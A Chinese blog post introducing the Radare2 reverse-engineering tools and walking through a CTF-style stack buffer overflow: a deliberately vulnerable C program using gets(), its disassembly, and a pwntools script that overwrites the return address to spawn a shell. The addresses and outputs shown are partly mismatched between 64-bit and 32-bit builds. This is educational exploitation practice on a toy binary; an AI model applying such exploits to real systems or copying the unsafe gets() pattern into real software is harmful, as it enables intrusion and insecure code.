---
title: Post4_Radare 使用记录
author: dashjay
date: '2019-12-11'
slug: post4-radare
categories: []
tags: []
---

[toc]



##  报告4 

选择产品：Radare2取证工具

#### 工具介绍

[**Radare**](https://github.com/radare/radare2)是一个取证工具以及可编写脚本的命令行十六进制编辑器，可以打开磁盘文件、支持分析二进制、反汇编代码、调试程序以及连接到远程gdb服务服务器的功能，我记得我高中的时候这工具曾进过Github TOP 30，但是由于各种原因，我们平时都使用GDB，也就忽略了这个工具，看到它被定义为取证工具的时候我有点好奇，什么是计算机取证........下面贴一下man手册中r2的描述

```bash

RADARE2(1)                BSD General Commands Manual               RADARE2(1)

NAME
     radare2 -- Advanced commandline hexadecimal editor, disassembler and
     debugger
```

#### 功能测试

众所周知GDB可以运行时（runtime）分析，但是R2只是一个静态分析的软件，让我来看看他有多强大，先分析一小段代码看看。

这个软件集成了许多小工具，看来平时写python小工具的时代结束了，这么多附带的小工具我来介绍下。

##### rax2 ---------> 用于数值转换

```bash
$rax2 -s 414141
AAAA%
```

看下man手册介绍

```

RAX2(1)                   BSD General Commands Manual                  RAX2(1)

NAME
     rax2 -- radare base converter
DESCRIPTION
     This command is part of the radare project.
     
     This command allows you to convert values between positive and negative integer, float, octal, binary and hexadecimal values.
```

这个小工具可以正负，整数，浮点数，十进制，二进制，十六进制等之间相互转换。

##### rasm2 -------> 反汇编和汇编

##### rabin2 -------> 查看文件格式(其实我就只是用来看字符串)

有时候用这种方法可以快速获得flag，我说的是签到题。

以下是使用命令查看二进制文件中的字符串

```bash
2017 ◯ : rabin2 -zz forkc | grep "TEXT."
022 0x00000ed2 0x100000ed2   4   7 (0.__TEXT.__text)  utf8 1\tǉE blocks=Basic Latin,Latin Extended-B
023 0x00000f7c 0x100000f7c  13  14 (3.__TEXT.__cstring) ascii my pid is %d\n
024 0x00000f8a 0x100000f8a  11  12 (3.__TEXT.__cstring) ascii fork failed
025 0x00000f96 0x100000f96   7   8 (3.__TEXT.__cstring) ascii /bin/ps
026 0x00000fa1 0x100000fa1  14  15 (3.__TEXT.__cstring) ascii child complete
```

##### radiff2 ------> 对文件进行 diff

##### ragg2/ragg2�cc ------> 用于更方便的生成shellcode

##### rahash2 ------> 各种密码算法， hash算法

```bash
$rahash2 -s I_LOVE_OUC -j
{"name":"sha256","hash":"0417b096e02a7c452bd7e9d0b4ff0b3322edf4b4b8e3eb434a9d9a072aa1c21c"}%
```

以上工具都是他附带的一些工具，最主要的程序叫做Radare2，是一个反汇编，的静态分析的神器。使用这个工具的原因一方面是自己能力不足，另一方面是CTF做题真的是来不及，使用这个程序可以大大的提高我在做题的时候的的速度和正确性

### Radare2



为了展示这个程序的厉害我从网上看到了一个小实验，上一段代码

```c
#include<stdio.h>
#include<stdlib.h>

void pwn(){
    system("/bin/sh");
}

void vulnerable(){
    char buffer[32];
    gets(buffer);
    return;
}

int main(){
    vulnerable();
    return 0;
}
```

按照常理来将，`/bin/sh`是不会被执行的，但是，并且编译出结果的我们本身是无法知道源代码的，这时候可以使用r2来汇编码

`> sudo gcc -o a buffer.c -no-pie -m32 -fno-stack-protector `

>  首先我先使用管理员权限编译这个代码，这里使用sudo只是为了将生成的目标文件的owner设置为root,当你以普通身份提权后可是获得root权限

```c
root@Aurora:/home/code/pwn/challenge/1 # sudo gcc -o a buffer.c -no-pie -m32 -fno-stack-protector 
buffer.c: In function ‘vulnerable’:
buffer.c:14:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
     gets(buffer);
     ^~~~
     fgets
/bin/ld: /tmp/ccQDe6dj.o: in function `vulnerable':
buffer.c:(.text+0x97): 警告：the `gets' function is dangerous and should not be used.
```

可见gets本身是一个十分危险的函数,他不会检查字符串的长度,而是以回车来判断输入是否结束,及其容易引发栈溢出.



&emsp;&emsp;解释一下这几个参数的作用:

- `-m32`:指的是生成32位程序
- `-fno-stack-protector`:字面意思,关闭栈保护,不生成canary
- `-no-pie`:关闭pie(Position Independent Executable),这个pie并不能吃,他使程序的地址被打乱,导致我们无法返回到固定目标地址.

&emsp;&emsp;你可以使用如下命令来运行它，并且按下5个a回车可以对程序进行全局分析，

```sh
> r2 ./a
[0x100000f60]>aaaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
......
[x] Finding function preludes
[x] Enable constraint types analysis for variables
```

使用> s main可以跳转到main函数，没有变化因为，r2给程序找了默认入口[0x100000f60]

```
[0x100000f60]>s main
[0x100000f60]>pdf
```

下面我们来分析一下这个main()函数:

编译成功后我们可以使用checksec工具检查编译生成的文件:

```sh
root@Aurora:/home/code/pwn/challenge/1 # checksec a 
[*] '/home/code/pwn/challenge/1/a'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

下面我们来分析一下这个main()函数:

```assembly
┌ (fcn) entry0 28
│   entry0 ();
│           ; var int32_t var_4h @ rbp-0x4
│           0x100000f60      55             push rbp
│           0x100000f61      4889e5         mov rbp, rsp
│           0x100000f64      4883ec10       sub rsp, 0x10
│           0x100000f68      c745fc000000.  mov dword [var_4h], 0
│           0x100000f6f      e8ccffffff     call sym._vuln
│           0x100000f74      31c0           xor eax, eax
│           0x100000f76      4883c410       add rsp, 0x10
│           0x100000f7a      5d             pop rbp
└           0x100000f7b      c3             ret

```

可以看出这是在main函数中调用了vuln

我们可以继续去看看vuln

```assembly
   sym._vuln ();
│           ; var char *var_28h @ rbp-0x28
│           ; var char *s @ rbp-0x20
│           ; CALL XREF from entry0 (0x100000f6f)
│           0x100000f40      55             push rbp
│           0x100000f41      4889e5         mov rbp, rsp
│           0x100000f44      4883ec30       sub rsp, 0x30              ; '0'
│           0x100000f48      488d7de0       lea rdi, [s]               ; char *s
│           0x100000f4c      e82b000000     call sym.imp.gets          ; char *gets(char *s)
│           0x100000f51      488945d8       mov qword [var_28h], rax
│           0x100000f55      4883c430       add rsp, 0x30              ; '0'
│           0x100000f59      5d             pop rbp
└           0x100000f5a      c3             ret
```

最关键的两行就是，这两行表示，把`*s`这个2*16字节的长度的字符串传入 rdi并且准备调用gets给他赋值

```assembly
0x100000f48      488d7de0       lea rdi, [s]               ; char *s
0x100000f4c      e82b000000     call sym.imp.gets          ; char *gets(char *s)
```

栈结构画一下，就是这样的。

```assembly
       																		 +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x28-->+-----------------+
```

看一下pwn的地址

```assembly
            ;-- section.0.__TEXT.__text:
            ;-- func.100000f20:
┌ (fcn) sym._pwn 29
│   sym._pwn ();
│           ; var int32_t var_4h @ rbp-0x4
│           0x100000f20      55             push rbp                   ; [00] -r-x section size 92 named 0.__TEXT.__text
│           0x100000f21      4889e5         mov rbp, rsp
```

发现是`0x100000f20`

假如我们输入的字符串为:`0x28 * 'a' 'bbbb' + pwn_addr`,那么由于gets只有读到回车才停,所以这一段字符串会把saved_ebp覆盖为bbbb,将ret_addr覆盖为pwn_addr,那么,此时栈的结构为:

```
                                           +-----------------+
                                           |   0x100000f20   |
                                           +-----------------+
                                           |       bbbb      |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

注:

> 前面提到,在内存中,每个值按照字节存储.一般都是按照小端存储,所以0x100000f20 在内存中的形式为

`\x20\x0f\x00\x00\x01`

到这里radare2的任务已经完成了，但是我还是使用python脚本完成这个题目。

```python
#!	/usr/bin/python2
#选择python2解释器

# -*- coding: UTF-8 -*-
#设置utf-8编码,为了支持中文

from pwn import *  #引入pwntools的库

context.log_level = 'debug' # 开启debug模式,可以记录发送和收到的字符串

sh = process('./a')  #构造与程序交互的对象

payload = 'a' * 40 + 'bbbb' + p32(0x08049182)  # 构造payload

sh.sendline(payload)  # 将字符串发送给程序

sh.interactive() # 将代码变为手动交互

```

然后用python解释器运行这个脚本就可以完成pwn

```python
root@Aurora:/home/code/pwn/challenge/1 # ./a.py
[+] Starting local process './a': pid 10160
[DEBUG] Sent 0x31 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  62 62 62 62  82 91 04 08  │aaaa│aaaa│bbbb│····│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode
[DEBUG] Received 0x33 bytes:
    "Hello,I'm dyf.\n"
    '\n'
    'QAQ\n'
    '\n'
    'Do you have something to say?\n'
Hello,I'm dyf.

QAQ

Do you have something to say?
$ 
```

按照以往的传统，我们都会输入一句

```bash
>whoami
room
```

那么一次利用radare2的一次缓冲区溢出漏洞利用就完成了。